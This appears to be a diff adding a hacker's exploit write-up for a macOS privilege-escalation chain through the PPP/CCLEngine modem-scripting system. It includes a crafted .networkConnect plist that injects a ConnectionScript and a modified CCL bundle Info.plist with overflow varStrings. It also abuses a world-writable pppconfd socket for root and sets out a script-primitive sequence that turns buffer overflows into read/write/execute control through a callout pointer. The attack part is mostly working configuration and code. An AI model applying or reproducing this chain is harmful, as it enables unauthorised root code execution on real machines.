@@ -1,0 +1,405 @@
+Alrighty, I have this exploit divided into 2 or 3 main parts. First part is the injection method. This is optional but it could be nice to use. It's a method to install the network config settings needed by creating a simple PLIST file with the extension .networkConnect. Here's an example of one... 
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<key>MODEM</key>
+	<dict>
+		<key>SystemConfig</key>
+		<dict>
+			<key>PPP</key>
+			<dict>
+				<key>ACSPEnabled</key>
+				<integer>0</integer>
+				<key>AuthPrompt</key>
+				<string>Before</string>
+				<key>CommDisplayTerminalWindow</key>
+				<integer>1</integer>
+				<key>CommRedialCount</key>
+				<integer>1</integer>
+				<key>CommRedialEnabled</key>
+				<integer>1</integer>
+				<key>CommRedialInterval</key>
+				<integer>5</integer>
+				<key>DialOnDemand</key>
+				<integer>0</integer>
+				<key>DisconnectOnFastUserSwitch</key>
+				<integer>1</integer>
+				<key>DisconnectOnIdle</key>
+				<integer>1</integer>
+				<key>DisconnectOnIdleTimer</key>
+				<integer>600</integer>
+				<key>DisconnectOnLogout</key>
+				<integer>1</integer>
+				<key>DisconnectOnSleep</key>
+				<integer>1</integer>
+				<key>IPCPCompressionVJ</key>
+				<integer>1</integer>
+				<key>IdleReminder</key>
+				<integer>0</integer>
+				<key>IdleReminderTimer</key>
+				<integer>1800</integer>
+				<key>LCPEchoEnabled</key>
+				<integer>1</integer>
+				<key>LCPEchoFailure</key>
+				<integer>4</integer>
+				<key>LCPEchoInterval</key>
+				<integer>10</integer>
+				<key>Logfile</key>
+				<string>/tmp/ppp/options</string>
+				<key>VerboseLogging</key>
+				<integer>1</integer>
+				<key>CommUseTerminalScript</key>
+				<integer>1</integer>
+				<key>CommTerminalScript</key>
+				<string>./test.sh</string>
+				<key>ConnectionScript</key>
+				<string>/Users/posixninja/Desktop/pwn.ccl<string>
+				<key>DeviceContextID</key>
+				<string>EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE</string>
+				<key>AccessPointName</key>
+				<string>GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG</string>
+			</dict>
+		</dict>
+		<key>UserConfigs</key>
+		<array>
+			<dict>
+				<key>PPP</key>
+				<dict>
+					<key>AuthName</key>
+					<string>abc</string>
+					<key>AuthPassword</key>
+					<string>884F79A1-EFEA-4D16-B90E-5966786E8A22</string>
+					<key>AuthPasswordEncryption</key>
+					<string>Keychain</string>
+					<key>CommRemoteAddress</key>
+					<string>123</string>
+					<key>ExportedPassword</key>
+					<data>
+					BfAoIyX4YcJv/S/n
+					</data>
+					<key>UserDefinedName</key>
+					<string>haxx</string>
+				</dict>
+			</dict>
+		</array>
+	</dict>
+</dict>
+</plist>
+
+there's a few different keys which can be added, but the main one here is "<key>ConnectionScript</key>". installing and running the script this way only gives you user permissions but that can be elevated once code execution is achieved. This will lead to unsigned code execution as user without needing code execution.
+
+To achieve root code execution we need to connect to the unix socket /var/run/pppconfd and send our settings and connect command from there. For some reason it doesn't drop permissions or restores them. This socket is chmod 777 so anyone can access it. The commands are simple and there's many, but for now we mostly only care about setting the connection script and having it launch CCLEngine (or launching it again if you're coming from the first plist file injection)
+
+The final part is the actual payload. I wrote a perl script to generate a CCL script file for me using multiple different weird machines discovered. (there are probably more to be found). The memory corruption happens by expanding an variable inside a limited length buffer (254 bytes for pascal strings). There are a couple of bugs caused by this. Mainly the MATCHSTR function which causes a stack buffer overflow, WRITE command which causes an overflow to the SV (Script Values) global structure variable, abd I also believe NOTE command has a similar issue.To exploit this you're required to set some "varStrings" to use later in the CCL script. This can be done by altering the Info.plist inside of the CCL bundle directory like follows....
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<key>CCL Personalities</key>
+	<dict>
+		<key>Default Personality</key>
+		<dict>
+			<key>Device Names</key>
+			<array>
+				<dict>
+					<key>DeviceModel</key>
+					<string>GPRS (GSM/3G)</string>
+					<key>DeviceVendor</key>
+					<string>Generic</string>
+				</dict>
+			</array>
+			<key>Connect Type</key>
+			<string>GPRS</string>
+			<key>Script Name</key>
+			<string>Base Script.ccl</string>
+			<key>GPRS Capabilities</key>
+			<dict>
+				<key>Data Mode</key>
+				<false/>
+				<key>Dial Mode</key>
+				<true/>
+				<key>Independent CIDs</key>
+				<false/>
+				<key>CID Query</key>
+				<true/>
+				<key>Maximum CID</key>
+				<integer>10</integer>
+			</dict>
+			<key>CCLParameters</key>
+			<dict>
+				<key>varString 28</key>
+				<string>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</string>
+				<key>varString 27</key>
+				<string>AAAAAAAAAAAAAA\x5e\x32\x37AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</string>
+				<key>Init String</key>
+				<string>A^27B^27C^27D</string>
+			</dict>
+		</dict>
+		<key>Samsung GPRS</key>
+		<dict>
+			<key>Device Names</key>
+			<array>
+				<dict>
+					<key>DeviceModel</key>
+					<string>GPRS (GSM/3G)</string>
+					<key>DeviceVendor</key>
+					<string>Samsung</string>
+				</dict>
+			</array>
+			<key>Connect Type</key>
+			<string>GPRS</string>
+			<key>Script Name</key>
+			<string>Base Script.ccl</string>
+			<key>GPRS Capabilities</key>
+			<dict>
+				<key>CID Query</key>
+				<true/>
+				<key>Data Mode</key>
+				<false/>
+				<key>Dial Mode</key>
+				<true/>
+				<key>Maximum CID</key>
+				<integer>3</integer>
+				<key>Independent CIDs</key>
+				<true/>
+			</dict>
+			<key>CCLParameters</key>
+			<dict>
+				<key>Init String</key>
+				<string>&amp;FE0Q0V1</string>
+			</dict>
+		</dict>
+		<key>Motorola GPRS</key>
+		<dict>
+			<key>Device Names</key>
+			<array>
+				<dict>
+					<key>DeviceModel</key>
+					<string>GPRS (GSM/3G)</string>
+					<key>DeviceVendor</key>
+					<string>Motorola</string>
+				</dict>
+			</array>
+			<key>Connect Type</key>
+			<string>GPRS</string>
+			<key>Script Name</key>
+			<string>Base Script.ccl</string>
+			<key>GPRS Capabilities</key>
+			<dict>
+				<key>CID Query</key>
+				<true/>
+				<key>Data Mode</key>
+				<false/>
+				<key>Dial Mode</key>
+				<true/>
+				<key>Maximum CID</key>
+				<integer>3</integer>
+				<key>Independent CIDs</key>
+				<true/>
+			</dict>
+			<key>CCLParameters</key>
+			<dict>
+				<key>Init String</key>
+				<string>&amp;F0&amp;D2&amp;C1E0V1W1S95=47</string>
+			</dict>
+		</dict>
+		<key>Nokia GPRS (S40/S60)</key>
+		<dict>
+			<key>CCLParameters</key>
+			<dict>
+				<key>Init String</key>
+				<string>&amp;FE0Q0V1&amp;C1&amp;D2+IFC=3,1</string>
+			</dict>
+			<key>Connect Type</key>
+			<string>GPRS</string>
+			<key>Device Names</key>
+			<array>
+				<dict>
+					<key>DeviceModel</key>
+					<string>GPRS (GSM/3G)</string>
+					<key>DeviceVendor</key>
+					<string>Nokia</string>
+				</dict>
+			</array>
+			<key>GPRS Capabilities</key>
+			<dict>
+				<key>Independent CIDs</key>
+				<true/>
+				<key>CID Query</key>
+				<true/>
+				<key>Data Mode</key>
+				<false/>
+				<key>Dial Mode</key>
+				<true/>
+				<key>Maximum CID</key>
+				<integer>1</integer>
+			</dict>
+			<key>Script Name</key>
+			<string>Base Script.ccl</string>
+		</dict>
+		<key>Sony Ericsson GPRS</key>
+		<dict>
+			<key>CCLParameters</key>
+			<dict>
+				<key>Init String</key>
+				<string>&amp;FE0Q0V1</string>
+			</dict>
+			<key>Connect Type</key>
+			<string>GPRS</string>
+			<key>Device Names</key>
+			<array>
+				<dict>
+					<key>DeviceModel</key>
+					<string>GPRS (GSM/3G)</string>
+					<key>DeviceVendor</key>
+					<string>Sony Ericsson</string>
+				</dict>
+			</array>
+			<key>GPRS Capabilities</key>
+			<dict>
+				<key>Independent CIDs</key>
+				<false/>
+				<key>CID Query</key>
+				<true/>
+				<key>Data Mode</key>
+				<false/>
+				<key>Dial Mode</key>
+				<true/>
+				<key>Maximum CID</key>
+				<integer>10</integer>
+			</dict>
+			<key>Script Name</key>
+			<string>Base Script.ccl</string>
+		</dict>
+		<key>Siemens GPRS</key>
+		<dict>
+			<key>Device Names</key>
+			<array>
+				<dict>
+					<key>DeviceModel</key>
+					<string>GPRS (GSM/3G)</string>
+					<key>DeviceVendor</key>
+					<string>Siemens</string>
+				</dict>
+			</array>
+			<key>Connect Type</key>
+			<string>GPRS</string>
+			<key>Script Name</key>
+			<string>Base Script.ccl</string>
+			<key>GPRS Capabilities</key>
+			<dict>
+				<key>Data Mode</key>
+				<false/>
+				<key>Dial Mode</key>
+				<true/>
+				<key>Independent CIDs</key>
+				<false/>
+				<key>CID Query</key>
+				<true/>
+				<key>Maximum CID</key>
+				<integer>10</integer>
+			</dict>
+			<key>CCLParameters</key>
+			<dict>
+				<key>Init String</key>
+				<string>&amp;FE0Q0V1</string>
+				<key>varString 27</key>
+				<string>^SGAUTH=1</string>
+			</dict>
+		</dict>
+	</dict>
+	<key>CFBundleIdentifier</key>
+	<string>com.apple.generic.modemscript.gprs</string>
+	<key>CFBundleName</key>
+	<string>Generic GPRS</string>
+	<key>CCL Version</key>
+	<integer>1</integer>
+	<key>CFBundleDevelopmentRegion</key>
+	<string>English</string>
+	<key>CFBundlePackageType</key>
+	<string>CCLB</string>
+	<key>CFBundleShortVersionString</key>
+	<string>10.8</string>
+	<key>CFBundleSignature</key>
+	<string>iSPM?</string>
+	<key>CFBundleVersion</key>
+	<string>5</string>
+</dict>
+</plist>
+
+
+So varString 26-30 can be set from here, but other ones also contain values we can set from the network config side, like username or password, phone number, etc... I also honestly think it's probably possible to even encode a varString inside of a varString which would allow this exploit to be triggered without an extra CCL script, just using the default ones installed on the system. That's another story though... inside of the CCL scripts are a number of nice primitives making it almost turing complete like JUMP, JSR, and RETURN. mixed with the overflow this allows you to read and write values  out of bounds from the "stack" buffer. Since we control the stack buffer as well as the topOfStack value. 
+
+/// JSR
+ SV.stack[--SV.topOfStack] = SV.scriptLine;	// save return line
+ NextInt(&i);
+ SV.scriptLine = SV.labels[i - 1];
+///
+JSR 2 // Sets SV.scriptLine = SV.stack[—SV.topOfStack]
+
+// stack = 16 ushort = 32/0x20 bytes
+@LABEL 2
+WRITE 2
+
+/// JUMP
+ NextInt(&i);
+  SV.scriptLine = SV.labels[i - 1];
+///
+JUMP 1 // Sets SV.scriptLine to label requested - 1 (so 0 here)
+
+/// RETURN
+ SV.scriptLine = SV.stack[SV.topOfStack++];
+///
+RETURN // Set SV.scriptLine to SV.stack[SV.topOfStack++]
+
+soooo..... basically it comes down to....
+
+@LABEL 1
+RESET
+@LABEL 2
+WRITE topOfStack // via overflow
+JSR X // To read stack[topOfStack] value
+WRITE topOfStack // via overflow
+RETURN  // To write scriptLine to stack[topOfStack]
+NOP // to ignore where in the script it jumps
+NOP // etc
+NOP // etc
+NOP // etc
+INCTRIES // ???
+JUMP 1 // continue to the next
+
+
+Script size is important though, and it enforces a 32k lines or 32k characters in the script which makes it tough. Since it's reading "shorts" 16bit and jumping to whatever line that is contained, I would be 64k lines to cover the entire address space. I've played with a couple of tricks to get around this limit, such as using the INCTRIES and IFTRIES commands count up to the value received in steps. From here I originally wanted to move a short from a varString address onto the "callout" pointer. the callout pointer is a linked list of timers which execute an arbitrary address with an arbitrary value whenever a character timeout occurs.
+
+/* --------------------------------------------------------------------------
+* calltimeout - Call any timeout routines which are now due.
+-------------------------------------------------------------------------- */
+void calltimeout()
+{
+    struct callout *p;
+
+    while (callout != NULL) {
+        p = callout;
+
+        if (gettimeofday(&timenow, NULL) < 0)
+            terminate(cclErr_NoMemErr);
+
+        if (!(p->c_time.tv_sec < timenow.tv_sec
+              || (p->c_time.tv_sec == timenow.tv_sec
+                  && p->c_time.tv_usec <= timenow.tv_usec)))
+            break;		/* no, it's not time yet */
+
+        callout = p->c_next;
+        (*p->c_func)(p->c_arg);
+
+        free((char *) p);
+    }
+}
+
+from there you have full read/write/execute primitives and <insert payload here>. It was fun and I'm sure there's tons of stuff I'm missing here. I'll include an encrypted zip file containing all the code I've written for this so far.
+
+Happy Hacking!!!
+
